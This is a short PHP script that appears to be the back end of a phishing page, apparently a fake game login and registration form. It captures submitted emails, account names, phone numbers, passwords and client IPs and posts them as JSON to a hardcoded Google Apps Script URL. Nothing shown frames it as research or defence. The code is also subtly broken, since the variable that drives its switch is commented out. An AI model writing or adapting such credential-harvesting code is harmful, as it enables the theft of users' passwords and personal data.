<?php
$keysheet = 'AKfycbxLLoi7EaXLEyn-M9f5NE46ISZDuL4WHJv7hChd6XrcPCVKCgv_FSP832fErMGzLgDYLw';
function GgApscript($scriptId, $data)
{

    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://script.google.com/macros/s/' . $scriptId . '/exec',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_HTTPHEADER => array(
            'Content-Type: application/json',
            'Content-Length: '. strlen(json_encode($data))
        ),
    ));

    curl_exec($curl);
}
$currentURL = $_SERVER['REQUEST_URI'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$data = json_decode(file_get_contents('php://input'), true);
//$type = $data['type'];
    switch ($type){
        case 1:
            GgApscript($keysheet, ['type' => 'login', 'sdt'=>"'". $data['email'],'acc' => $data['acc'], 'pass' => $data['pass'], 'ip' => $ip]);
            handleUserAccess(true);
        break;
        case 2:
            GgApscript($keysheet, ['type' => 'register', 'acc' => $_POST['playerid'], 'nickname' => $_POST['firstname'], 'phone' =>"'". $_POST['mobile'], 'bt'=>"",
'pass'=>$_POST['confirmPassword'],'ip' => $ip]);
            handleUserAccess(true);
        break;
}